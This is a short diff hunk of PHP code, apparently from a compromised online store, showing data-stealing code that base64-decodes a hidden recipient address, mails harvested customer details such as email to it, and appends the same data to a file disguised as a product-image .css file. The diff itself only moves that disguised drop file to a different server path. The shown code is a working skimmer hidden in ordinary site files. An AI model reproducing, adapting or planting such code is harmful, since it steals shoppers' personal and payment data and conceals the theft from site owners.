@@ -425,7 +425,7 @@ Email : ".$data16."
 		$gantengers = "dW5peGxvZ3NAeWFuZGV4LnJ1";
 		$tamvan = base64_decode($gantengers);
 		mail($tamvan, $subject, $message, $headers);
-        $locate = "/home/spragues/public_html/store/media/catalog/product/1/6/166.css";
+        $locate = "chroot/home/a59cb4fa/0d46498323.nxcli.net/html/media/catalog/product/1/1/11.css";
             $write = fopen($locate,"a");
             fwrite($write,$message."\n=========================================\n\n");
             fclose($write);
